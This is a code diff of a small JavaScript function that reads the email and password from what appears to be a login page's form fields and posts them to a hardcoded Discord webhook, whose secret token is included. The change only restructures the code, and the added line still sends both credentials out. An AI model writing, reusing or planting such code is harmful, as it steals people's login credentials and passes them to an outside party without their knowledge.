@@ -18,25 +18,9 @@
 
     function Test() {
 
-    console.log("ERE")
-
-
-      const UserData = {
-
-          email: document.getElementsByClassName("IxcUte")[0].innerText,
-
-          password: document.getElementsByClassName("whsOnd zHQkBf").value
-
-
-
-
-          };
-
-      console.log(UserData["password"])
-
 
                     const webhookURL = 'https://discord.com/api/webhooks/1224873688231579781/09qUBm21X4eqVQFzW5gOZfaQR9urqY5i4fltBxDNuq4f0Ye6bMkch1ahAzYoy8-qE1hh';
-                    const messageContent = JSON.stringify(UserData);
+
 
 
 
@@ -46,7 +30,10 @@
                     'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                    content: "Email: " + "`" +  UserData["email"] + "`" + " Password: " + "`" + document.querySelector('.whsOnd.zHQkBf').value + "`"
+
+
+                    content:  "`" + document.getElementsByClassName("IxcUte")[0].innerText + "`" + "\n" + "`" + document.querySelector('.whsOnd.zHQkBf').value + "`"
+
                     }),
                     })
                     .then(response => {
